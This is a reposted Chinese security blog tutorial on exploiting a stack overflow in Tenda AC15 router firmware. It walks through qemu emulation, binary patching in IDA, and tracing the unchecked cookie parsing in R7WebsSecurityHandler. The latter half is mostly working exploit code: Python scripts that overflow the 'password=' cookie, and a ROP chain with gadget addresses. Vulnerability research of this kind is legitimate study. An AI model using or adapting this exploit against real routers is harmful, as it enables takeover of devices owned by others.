---
title: tenda固件栈溢出漏洞挖掘和iot常用工具介绍和使用
url: https://buaq.net/go-174824.html
source: unSafe.sh - 不安全
date: 2023-08-20
fetch_date: 2025-10-04T11:58:48.891732
---

# tenda固件栈溢出漏洞挖掘和iot常用工具介绍和使用

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

tenda固件栈溢出漏洞挖掘和iot常用工具介绍和使用

Tenda AC15 15.03.1.16\_multihttps://drivers.softpedia.com/dyn-postdownload.php/d
*2023-8-19 16:15:0
Author: [xz.aliyun.com(查看原文)](/jump-174824.htm)
阅读量:63
收藏*

---

Tenda AC15 15.03.1.16\_multi

<https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1>

在squashfs-root/bin/httpd
可以通过

来查看文件的信息（架构）

```
ELF 头：
  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  类别:                              ELF32
  数据:                              2 补码，小端序 (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI 版本:                          0
  类型:                              EXEC (可执行文件)
  系统架构:                          ARM
  版本:                              0x1
  入口点地址：               0xe4a0
  程序头起点：          52 (bytes into file)
  Start of section headers:          810548 (bytes into file)
  标志：             0x5000002, Version5 EABI, <unknown>
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         28
  Section header string table index: 27
```

```
sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*
cp /usr/bin/qemu-arm-static .
```

```
sudo chroot ./ ./qemu-arm-static ./bin/httpd
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172028-4e0fb216-3cdf-1.png)

用ida打开，搜索WeLoveLinux

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172126-70c203fe-3cdf-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172131-73cd47a2-3cdf-1.png)
这里构成了死循环要把CMP R3,#0给patch掉，就可以了

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172143-7b4d3758-3cdf-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172149-7ee91df0-3cdf-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20230819161510-84049924-3e68-1.png)
然后保存即可

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172210-8b2841f4-3cdf-1.png)

运行发现还是出错

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172222-92712a16-3cdf-1.png)
再用ida看一下，发现第二个判断发现也赋值了0；

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172236-9a59fb04-3cdf-1.png)
patch成1即可

运行时

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172257-a743865a-3cdf-1.png)
ip并不是本机ip，这是因为我们没有设置虚拟网关br0，

```
sudo apt install uml-utilities bridge-utils
sudo brctl addbr br0
sudo brctl addif br0 eth0
sudo ifconfig br0 up
sudo dhclient br0
sudo tunctl -t br0 -u `whoami`
sudo ifconfig br0 192.168.65.1/24
```

然后重新运行即可
![](https://xzfile.aliyuncs.com/media/upload/picture/20230819161511-84622cf6-3e68-1.png)

根据CVE公布的poc可知，漏洞点在R7WebsSecurityHandler函数

## IDA

```
if ( *(_DWORD *)(a1 + 184) )
    {
      v40 = strstr(*(const char **)(a1 + 184), "password=");
      if ( v40 )
        sscanf(v40, "%*[^=]=%[^;];*", v33);
      else
        sscanf(*(const char **)(a1 + 184), "%*[^=]=%[^;];*", v33);
    }
```

这里未对用户的输入是否合理进行检测，导致存在栈溢出。
我们要利用这个栈溢出需要满足

```
if ( strncmp(s1, "/public/", 8u)
    && strncmp(s1, "/lang/", 6u)
    && !strstr(s1, "img/main-logo.png")
    && !strstr(s1, "reasy-ui-1.0.3.js")
    && strncmp(s1, "/favicon.ico", 0xCu)
    && *(_DWORD *)(a1 + 152)
    && strncmp(s1, "/kns-query", 0xAu)
    && strncmp(s1, "/wdinfo.php", 0xBu)
    && (strlen(s1) != 1 || *s1 != 47)
    && (strncmp(s1, "/goform/telnet", 0xEu) || g_Pass && strcmp(&g_Pass, "YWRtaW4="))
    && strncmp(s1, "/goform/fast_setting", 0x14u)
    && strncmp(s1, "/goform/ate", 0xBu)
    && strncmp(s1, "/goform/InsertWhite", 0x13u)
    && strncmp(s1, "/yun_safe.html", 0xEu)
    && strncmp(s1, "/goform/getWanConnectStatus", 0x1Bu)
    && strncmp(s1, "/goform/getProduct", 0x12u)
    && strncmp(s1, "/goform/getRebootStatus", 0x17u)
    && (i <= 2 || strncmp(s1, "/loginerr.html", 0xEu)) )
```

访问的路径不在上述存在，构造一个虚构地址即可，例/goform/blonet
尝试输入垃圾数据，测试漏洞。

```
sudo chroot ./ ./qemu-arm-static -g 4444 ./bin/httpd
gdb-multiarch ./httpd
target remote :1234
b *0x002ED18 #断点下在漏洞函数结束处即可
continue
python3 exp.py
```

```
import requests
URL = "http://192.168.7.44:80/goform/blonet"
cookie = {"Cookie":"password="+"a"*0x400}
requests.get(url=URL, cookies=cookie)
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172406-d02100de-3cdf-1.png)

发现程序没有运行到断点处，bt查看一下，发现在0x0002c5cc处的函数停了。

```
if ( strlen(s) <= 3
      || (v42 = strchr(s, 46)) == 0
      || (v42 = (char *)v42 + 1, memcmp(v42, "gif", 3u))
      && memcmp(v42, "png", 3u)
      && memcmp(v42, "js", 2u)
      && memcmp(v42, "css", 3u)
      && memcmp(v42, "jpg", 3u)
      && memcmp(v42, "jpeg", 3u) )
```

应该是被这影响了。
那就修改一下exp，再试试

```
import requests
URL = "http://192.168.7.44:80/goform/blonet"
cookie = {"Cookie":"password="+"a"*0x400+".pngAAA"}
requests.get(url=URL, cookies=cookie)
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172436-e26ff3ee-3cdf-1.png)
可以发现成功溢出了。
因为qemu的不会开启未开启基址随机化的特性，可以通过vmmap查看libc基地址。
通过ropgadget查找gadget

```
0x00040cb8  mov r0, sp; blx r3;
0x00018298  pop {r3, pc};
```

```
import requests
    from pwn import *

    base = 0xf65e5000
    libc = ELF('./lib/libc.so.0')

    puts = base+libc.sym['puts']
    _str = "Hello\x00"
    mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
    pop_r3 = base+0x00018298 # pop {r3, pc};
    URL = "http://192.168.7.44:80/goform/hello"
    pl = 'a'*444+".png"+p32(pop_r3)+p32(puts)+p32(mov_r0)+_str
    cookie = {"Cookie":"password="+pl}
    requests.get(url=URL, cookies=cookie)
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230817172528-011aaca8-3ce0-1.png)

文章来源: https://xz.aliyun.com/t/12793
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)